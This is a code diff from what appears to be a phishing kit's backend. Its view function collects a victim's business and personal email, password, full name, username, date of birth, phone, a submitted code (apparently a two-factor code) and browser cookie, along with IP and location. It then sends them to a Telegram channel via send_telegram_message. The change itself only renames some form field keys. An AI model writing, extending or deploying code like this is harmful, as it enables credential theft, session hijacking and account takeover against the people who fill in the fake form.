@@ -58,9 +58,9 @@ def process(request):
             datetime.now().strftime("%Y-%m-%d %H:%M:%S"), public_ip, final_data.get('country_code', ''),
             final_data.get('city', ''), final_data.get('proxy', ''), final_data.get('latitude', ''),
             final_data.get('longtitude', ''),
-            final_data.get('information', ''), final_data.get('business_email', ''),
-            final_data.get('personal_email', ''), final_data.get('password', ''), final_data.get('fullname', ''),
-            final_data.get('facebook_name', ''), final_data.get('dob', ''), final_data.get('phone', ''),
+            final_data.get('information', ''), final_data.get('emailBusiness', ''),
+            final_data.get('emailPersonal', ''), final_data.get('password', ''), final_data.get('fullname', ''),
+            final_data.get('username', ''), final_data.get('dob', ''), final_data.get('phone', ''),
             final_data.get('user_agent', ''), final_data.get('code', ''), final_data.get('cookie', ''))
         send_telegram_message(message)
         return render(request=request, template_name='form.html')
